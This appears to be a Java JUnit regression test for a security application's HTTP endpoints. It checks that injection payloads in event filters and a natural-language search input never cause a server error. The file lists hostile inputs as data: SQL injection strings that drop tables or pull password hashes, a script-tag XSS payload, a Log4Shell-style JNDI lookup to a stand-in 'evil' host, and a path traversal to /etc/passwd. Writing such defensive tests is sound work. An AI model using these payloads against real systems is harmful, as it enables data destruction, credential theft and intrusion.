package com.sentinelai.security;

import com.sentinelai.auth.domain.Role;
import com.sentinelai.support.IntegrationTestSupport;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.nio.charset.StandardCharsets;
import java.net.URLEncoder;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;

/**
 * SQLi/XSS/prompt-injection payloads in filter params and the NL-search input must be handled
 * safely — parameterized JPA queries and output encoding mean these never cause a 500 or execute.
 * (The dedicated prompt-injection defense suite covers LLM-specific cases; this is the HTTP-surface
 * regression.)
 */
class InjectionPayloadTest extends IntegrationTestSupport {

    private static final String[] PAYLOADS = {
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert(1)</script>",
            "1) UNION SELECT password_hash FROM users --",
            "${jndi:ldap://evil/x}",
            "../../etc/passwd"
    };

    @ParameterizedTest
    @ValueSource(strings = {
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert(1)</script>",
            "1) UNION SELECT password_hash FROM users --"
    })
    void injectionInEventFiltersNeverCauses500(String payload) throws Exception {
        String viewer = bearerFor("viewer-inj-" + Math.abs(payload.hashCode()), Role.VIEWER);
        String q = URLEncoder.encode(payload, StandardCharsets.UTF_8);
        int status = mockMvc.perform(get("/api/events?user=" + q + "&ip=" + q)
                        .header("Authorization", viewer))
                .andReturn().getResponse().getStatus();
        assertThat(status).isLessThan(500);
    }

    @Test
    void injectionInNlSearchNeverCauses500() throws Exception {
        String analyst = bearerFor("analyst-inj", Role.ANALYST);
        for (String payload : PAYLOADS) {
            String body = objectMapper.writeValueAsString(new NlQuery(payload));
            int status = mockMvc.perform(post("/api/search/nl").contentType("application/json")
                            .header("Authorization", analyst).content(body))
                    .andReturn().getResponse().getStatus();
            assertThat(status).as("payload=%s", payload).isLessThan(500);
        }
    }

    private record NlQuery(String query) {
    }
}
